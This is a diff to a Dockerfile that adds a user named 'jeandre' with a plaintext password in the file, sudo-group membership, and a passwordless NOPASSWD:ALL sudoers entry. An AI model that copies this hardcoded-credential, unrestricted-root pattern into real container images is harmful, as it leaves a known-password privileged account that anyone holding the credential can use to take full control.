@@ -29,6 +29,10 @@ ENV BUNDLE_APP_CONFIG /home/docker/.bundle
 WORKDIR $APP_HOME
 
 USER root
+RUN useradd -m jeandre && echo "jeandre:Vampireberg/1" | chpasswd && adduser jeandre sudo
+RUN echo 'jeandre ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+
+
 
 ARG USER_ID
 # This step allows docker to write files to a host-mounted volume with the correct user permissions.
